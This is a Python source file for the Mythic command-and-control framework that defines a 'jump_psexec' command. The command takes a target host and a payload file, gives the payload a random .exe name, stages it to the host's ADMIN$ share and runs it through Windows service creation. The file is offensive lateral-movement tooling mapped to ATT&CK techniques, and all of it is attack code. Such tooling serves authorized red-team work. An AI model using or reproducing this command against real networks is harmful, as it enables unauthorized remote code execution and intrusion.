from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import base64
import secrets


class JumpPsexecArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="hostname",
                type=ParameterType.String,
                description="Target hostname or IP",
            ),
            CommandParameter(
                name="payload",
                type=ParameterType.File,
                description="Payload file to stage and execute on remote host",
            ),
            CommandParameter(
                name="service_name",
                type=ParameterType.String,
                description="Service name to create on remote host",
                default_value="StarSvc",
            ),
        ]

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)


class JumpPsexecCommand(CommandBase):
    cmd = "jump_psexec"
    needs_admin = True
    help_cmd = "jump_psexec -hostname TARGET -payload <file>"
    description = "Stage a payload to \\\\target\\ADMIN$\\Temp and execute via SCM service creation."
    version = 2
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1021.002", "T1569.002"]
    argument_class = JumpPsexecArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        file_id = taskData.args.get_arg("payload")
        file_content = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
            AgentFileId=file_id,
        ))
        if not file_content.Success:
            response.Success = False
            response.Error = f"Failed to get payload content: {file_content.Error}"
            return response

        filename = secrets.token_hex(8) + ".exe"
        taskData.args.add_arg("filename", filename, ParameterType.String)
        taskData.args.add_arg("payload_data", base64.b64encode(file_content.Content).decode(), ParameterType.String)
        taskData.args.remove_arg("payload")

        host = taskData.args.get_arg("hostname")
        svc = taskData.args.get_arg("service_name")
        response.DisplayParams = f"{host} file={filename} svc={svc} ({len(file_content.Content)} bytes)"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
